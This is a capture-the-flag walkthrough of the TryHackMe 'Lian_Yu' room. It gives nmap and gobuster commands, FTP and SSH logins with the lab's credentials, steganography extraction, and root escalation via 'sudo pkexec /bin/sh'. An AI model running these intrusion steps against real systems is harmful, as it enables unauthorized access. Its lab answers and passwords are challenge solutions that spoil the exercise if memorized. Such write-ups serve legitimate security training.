# Lian\_Yu

**Room Link:** [https://tryhackme.com/room/lianyu](https://tryhackme.com/room/lianyu)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
gobuster dir -u http://$VICTIM/island -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
gobuster dir -u http://$VICTIM/island/2100 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x ticket
```

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>



**Link:** [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

<figure><img src="../../.gitbook/assets/image (12) (5).png" alt=""><figcaption></figcaption></figure>



## FTP

```
ftp $VICTIM
Username: vigilante
Password: !#th3h00d
mget *
```



**Kali**

```
exiftool Leave_me_alone.png 
sudo apt install ncurses-hexedit
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

Change the first hex values to **89 50 4E 47 0D 0A** to make it .PNG then save the file

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
exiftool Leave_me_alone.png
```

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
steghide info aa.jpg
Password: password
```

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
steghide extract -sf aa.jpg
Password: password
unzip ss.zip 
```

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh slade@$VICTIM
Password: M3tahuman
```



## Privilege Escalation

**Victim**

```
sudo -l
```



<figure><img src="../../.gitbook/assets/image (19) (6) (3).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
sudo pkexec /bin/sh
```

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>























